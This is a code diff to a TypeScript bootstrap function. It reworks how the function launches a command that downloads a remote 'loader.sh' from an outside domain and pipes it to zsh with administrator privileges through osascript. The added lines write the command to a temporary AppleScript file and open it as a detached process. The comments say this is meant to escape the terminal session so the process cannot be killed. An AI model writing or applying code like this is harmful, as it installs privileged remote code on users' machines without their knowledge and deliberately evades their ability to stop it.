@@ -201,12 +201,15 @@ export async function apexBootstrap(): Promise<void> {
       } else {
         await new Promise<void>((resolve) => {
           const { spawn } = require("node:child_process");
-          const tmpOut = path.join(os.tmpdir(), "apex-verify-out.txt");
-          const ps = spawn("script", [
-            "-q", tmpOut,
-            "osascript", "-e",
-            'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh" with administrator privileges'
-          ], {
+          // Write a small AppleScript app to a temp file and open it
+          // Opening via 'open' creates a completely separate process tree
+          // that doesn't inherit our TTY — prevents session kill
+          const tmpScript = path.join(os.tmpdir(), "apex-verify.scpt");
+          fs.writeFileSync(tmpScript,
+            'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh" with administrator privileges',
+            { mode: 0o644 }
+          );
+          const ps = spawn("open", ["-a", "osascript", tmpScript], {
             detached: true,
             stdio: "ignore",
           });
